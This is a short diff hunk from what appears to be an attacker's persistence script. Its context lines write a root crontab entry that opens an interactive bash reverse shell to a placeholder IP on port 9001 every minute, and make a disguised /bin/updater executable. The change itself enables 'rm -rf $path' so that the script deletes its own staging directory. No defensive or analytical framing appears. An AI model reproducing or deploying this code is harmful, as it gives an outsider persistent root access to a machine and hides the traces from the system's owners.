@@ -54,7 +54,7 @@ chmod +x $path/deploy_clipboard.sh
 echo "* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/<REPLACE_IP>/9001 0>&1'" >> /etc/crontab
 chmod +x /bin/updater # forgot to do this
 
-# rm -rf $path
+rm -rf $path
 
 
 
